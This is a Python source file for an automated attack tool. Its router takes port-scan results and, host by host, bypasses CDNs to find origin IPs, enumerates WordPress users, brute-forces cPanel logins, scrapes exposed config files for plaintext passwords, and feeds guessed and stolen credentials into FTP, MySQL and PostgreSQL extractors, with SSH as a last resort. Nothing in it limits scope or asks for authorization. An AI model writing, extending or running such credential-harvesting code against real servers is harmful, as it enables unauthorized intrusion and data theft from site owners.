"""Extractor router — runs extractors in priority order with credential injection."""

import os

BASE_DIR = os.path.dirname(os.path.abspath(__file__))


class ExtractorRouter:
    """Routes targets through extractors in priority order with credential sharing."""

    def __init__(self, results: dict, scanner=None):
        """Initialize router with scan results and optional scanner reference.

        Args:
            results (dict): The results dict from PortScanner, keyed by domain_id.
            scanner (PortScanner): Scanner instance for re-scanning discovered origin IPs.
        """
        self.results = results
        self.scanner = scanner
        self.found_credentials = {}  # domain_id -> list of (user, pass)

    def run(self):
        """Iterate all targets running extractors in priority order:
        1. CDN bypass
        2. cPanel brute force (fast, gives full access)
        3. Config scraper (find plaintext creds in exposed files)
        4. FTP / MySQL / PostgreSQL
        5. SSH only as last resort if nothing else worked
        """
        for domain_id, data in list(self.results.items()):
            ip = data['ip']
            host = data['host']
            print(f"\n[ROUTER] Checking extractors for {host} ({ip})")

            # 1. CDN bypass
            self._run_cdn_bypass(domain_id, ip, host)

            # 2. WPScan / Nikto recon (HTTP/HTTPS only)
            if self._has_port(data, 80) or self._has_port(data, 443):
                port = 443 if self._has_port(data, 443) else 80
                self._run_wpscan(domain_id, ip, host, port)
                
            # 3. cPanel brute force
            if self._has_port(data, 2083):
                self._run_cpanel(domain_id, ip, host)

            # 4. Config scraper if cPanel failed
            if not self.found_credentials.get(domain_id):
                self._run_config_scraper(domain_id, ip, host)

            # 5. Service extractors
            for port_entry in data['open_ports']:
                port = port_entry['port']
                service = port_entry['service']

                if service == 'SSH':
                    if self.found_credentials.get(domain_id):
                        print(f"  [SKIP] Port {port} (SSH) — credentials already found")
                    else:
                        self._dispatch(domain_id, ip, port, service)
                else:
                    self._dispatch(domain_id, ip, port, service)

    def _has_port(self, data: dict, port: int) -> bool:
        """Check if a specific port is in the target's open ports.

        Args:
            data (dict): Target data dict.
            port (int): Port number to check.

        Returns:
            bool: True if port is open.
        """
        return any(p['port'] == port for p in data['open_ports'])

    def _run_cdn_bypass(self, domain_id: str, ip: str, host: str):
        """Run CDN bypass detection and trigger re-scan if origin IP is found.

        Args:
            domain_id (str): Target identifier.
            ip (str): Current resolved IP.
            host (str): Original domain name.
        """
        from src.utils.extractors.cdn_bypass import CDNBypassDetector
        detector = CDNBypassDetector(ip=ip, port=443, host=host)
        result = detector.run()
        if result.get('cdn') and result.get('origin_ip'):
            origin_ip = result['origin_ip']
            self.results[domain_id]['cdn_bypass'] = result
            if self.scanner:
                print(f"\n[ROUTER] Re-scanning origin IP {origin_ip} for {host}")
                self.scanner._scan_target(f"{domain_id}_origin", host, origin_ip)
                self.scanner._export_json()


    def _run_wpscan(self, domain_id: str, ip: str, host: str, port: int):
        from src.utils.extractors.wpscan_extractor import WPScanExtractor
        extractor = WPScanExtractor(ip=ip, host=host, port=port)
        result = extractor.run()
        if result['status'] == 'success':
            self.results[domain_id]['wpscan'] = result
            # Inject discovered usernames into credential pool for subsequent attacks
            if result['users']:
                self.found_credentials.setdefault(domain_id, [])
                for user in result['users']:
                    for pwd in ['', 'admin', '123456', user]:
                        self.found_credentials[domain_id].insert(0, (user, pwd))



    def _run_cpanel(self, domain_id: str, ip: str, host: str):
        """Run cPanel brute force and store found credentials.

        Args:
            domain_id (str): Target identifier.
            ip (str): Target IP.
            host (str): Domain name.
        """
        from src.utils.extractors.cpanel import CPanelExtractor
        extractor = CPanelExtractor(ip=ip, port=2083, host=host)
        result = extractor.run()
        if result.get('credentials'):
            creds = [(c['user'], c['password']) for c in result['credentials']]
            self.found_credentials[domain_id] = creds
            self.results[domain_id]['cpanel_credentials'] = result['credentials']

    def _run_config_scraper(self, domain_id: str, ip: str, host: str):
        """Run HTTP config scraper and inject found passwords into credential pool.

        Args:
            domain_id (str): Target identifier.
            ip (str): Target IP.
            host (str): Domain name.
        """
        from src.utils.extractors.http_config_scraper import HTTPConfigScraper
        scraper = HTTPConfigScraper(host=host, ip=ip)
        result = scraper.run()
        if result['credentials']:
            self.results[domain_id]['config_credentials'] = result['credentials']
            passwords = set()
            for path_creds in result['credentials'].values():
                for key in ('db_password', 'password'):
                    if key in path_creds:
                        passwords.add(path_creds[key])
            if passwords:
                print(f"  [ROUTER] Injecting {len(passwords)} scraped passwords into credential pool")
                self.found_credentials.setdefault(domain_id, [])
                for user in ['root', 'admin', 'cpanel']:
                    for pwd in passwords:
                        self.found_credentials[domain_id].insert(0, (user, pwd))

    def _dispatch(self, domain_id: str, ip: str, port: int, service: str):
        """Call the appropriate extractor based on service name.

        Args:
            domain_id (str): Target identifier.
            ip (str): Target IP.
            port (int): Open port number.
            service (str): Service label from scanner.
        """
        from src.utils.extractors.mysql import MySQLExtractor
        from src.utils.extractors.postgres import PostgresExtractor
        from src.utils.extractors.ftp import FTPExtractor
        from src.utils.extractors.ssh import SSHExtractor

        extractors = {
            'MySQL':      MySQLExtractor,
            'PostgreSQL': PostgresExtractor,
            'FTP':        FTPExtractor,
        }

        extractor_class = extractors.get(service)
        if extractor_class:
            print(f"  [MATCH] Port {port} ({service}) — launching extractor")
            extractor = extractor_class(ip, port)
            extractor.run()
        else:
            print(f"  [SKIP] Port {port} ({service}) — no extractor available")
